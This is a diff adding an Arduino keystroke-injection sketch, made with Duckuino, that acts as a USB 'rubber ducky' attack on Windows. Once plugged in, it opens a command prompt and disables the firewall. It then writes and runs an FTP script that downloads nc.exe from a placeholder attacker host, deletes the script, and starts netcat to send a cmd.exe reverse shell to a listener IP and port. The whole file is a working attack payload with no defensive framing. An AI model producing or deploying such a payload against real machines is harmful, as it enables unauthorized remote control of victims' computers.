@@ -1,0 +1,113 @@
+/**
+ * Made with Duckuino, an open-source project.
+ * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
+ */
+
+#include "Keyboard.h"
+
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  delay(10000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(200);
+  Keyboard.print(F("cmd"));
+
+  typeKey(KEY_RETURN);
+
+  delay(600);
+  Keyboard.print(F("cd %USERPROFILE%"));
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+  Keyboard.print(F("netsh firewall set opmode disable"));
+
+  typeKey(KEY_RETURN);
+
+  delay(2000);
+  Keyboard.print(F("echo open [IP] [PORT] > ftp.txt"));
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+  Keyboard.print(F("echo [USERNAME]>> ftp.txt"));
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+  Keyboard.print(F("echo [PASSWORD]>> ftp.txt"));
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+  Keyboard.print(F("echo bin >> ftp.txt"));
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+  Keyboard.print(F("echo get nc.exe >> ftp.txt"));
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+  Keyboard.print(F("echo bye >> ftp.txt"));
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+  Keyboard.print(F("ftp -s:ftp.txt"));
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print(F("del ftp.txt & exit"));
+
+  typeKey(KEY_RETURN);
+
+  delay(2000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(200);
+  Keyboard.print(F("nc.exe [LISTENER IP] [LISTENER PORT] -e cmd.exe -d"));
+
+  typeKey(KEY_RETURN);
+
+  delay(2000);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(200);
+  Keyboard.print(F("cmd"));
+
+  typeKey(KEY_RETURN);
+
+  delay(600);
+  Keyboard.print(F("exit"));
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
